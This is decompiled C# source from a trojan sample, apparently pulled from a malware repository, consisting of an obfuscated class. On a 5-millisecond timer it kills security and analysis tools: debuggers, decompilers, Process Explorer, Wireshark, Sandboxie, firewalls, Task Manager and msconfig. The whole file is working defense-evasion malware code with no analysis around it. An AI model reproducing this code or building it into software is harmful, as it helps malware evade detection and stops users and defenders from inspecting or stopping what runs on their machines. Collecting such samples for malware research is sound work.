// Decompiled with JetBrains decompiler
// Type: @ӗ
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A333FCE7-81CE-4CAF-8053-DB422244ECF1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-a6a135c2b4d2e961071a0291c88f3690fe0734ba8f8b54b41ef339d643325fb9.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Diagnostics;
using System.Timers;

public class \u0040ӗ
{
  private static \u0040Ә \u0040ӓ = new \u0040Ә();
  private static Timer \u0040Ӕ;

  [DebuggerNonUserCode]
  public \u0040ӗ()
  {
  }

  public static void \u0040ӕ(object _param0, ElapsedEventArgs _param1)
  {
    if (\u0040Ә.\u0040Ԕ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("processhacker");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԩ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("dnSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԗ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("procexp");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԗ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("SbieCtrl");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԕ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("SpyTheSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԙ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("wireshark");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԙ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("apateDNS");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԛ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("IPBlocker");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԛ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("TiGeR-Firewall");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԝ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("smsniff");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԝ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("NetSnifferCs");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԟ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("Sandboxie Control");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԟ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("taskmgr");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԡ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("msconfig");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԡ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("ILSpy");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԣ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("CodeReflect");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040ԣ == Conversions.ToBoolean("True"))
    {
      Process[] processesByName = Process.GetProcessesByName("Reflector");
      int index = 0;
      while (index < processesByName.Length)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }
    if (\u0040Ә.\u0040Ԥ != Conversions.ToBoolean("True"))
      return;
    Process[] processesByName1 = Process.GetProcessesByName("MegaDumper");
    int index1 = 0;
    while (index1 < processesByName1.Length)
    {
      processesByName1[index1].Kill();
      checked { ++index1; }
    }
  }

  public static void \u0040Ӗ()
  {
    \u0040ӗ.\u0040Ӕ = new Timer(5.0);
    \u0040ӗ.\u0040Ӕ.Elapsed += new ElapsedEventHandler(\u0040ӗ.\u0040ӕ);
    \u0040ӗ.\u0040Ӕ.Enabled = true;
  }
}
